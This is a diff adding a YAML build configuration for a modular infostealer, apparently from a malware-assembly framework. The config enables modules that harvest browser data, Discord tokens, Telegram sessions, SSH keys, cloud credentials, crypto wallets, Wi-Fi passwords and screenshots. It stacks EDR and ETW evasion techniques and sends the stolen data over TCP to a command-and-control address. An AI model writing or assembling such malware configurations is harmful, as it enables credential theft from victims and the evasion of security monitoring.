@@ -1,0 +1,37 @@
+name: infostealer_tartarus_cs_v3
+description: Infostealer with Tartarus Gate sorted SSN recovery, Gargoyle ROP sleep,
+  ETW buffer corruption, callback execution
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/system_info
+- collectors/processes
+- collectors/installed_software
+- collectors/env_vars
+- collectors/clipboard
+- collectors/wifi_passwords
+- collectors/browser_chromium
+- collectors/discord_tokens
+- collectors/telegram_session
+- collectors/ftp_credentials
+- collectors/ssh_keys
+- collectors/cloud_creds
+- collectors/crypto_wallets
+- collectors/screenshot
+exfil: exfil/tcp_direct
+arch: arch/standalone
+api_resolve: api_resolve/api_hash_fnv1a
+resources: true
+evasion:
+- evasion/tartarus_gate
+- evasion/etw_buffer_corrupt
+- evasion/stack_spoof_rop
+- evasion/unhook_ntdll
+- evasion/anti_sandbox_artifacts
+- evasion/behavioral_pacing
+- evasion/sleep_cronos
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
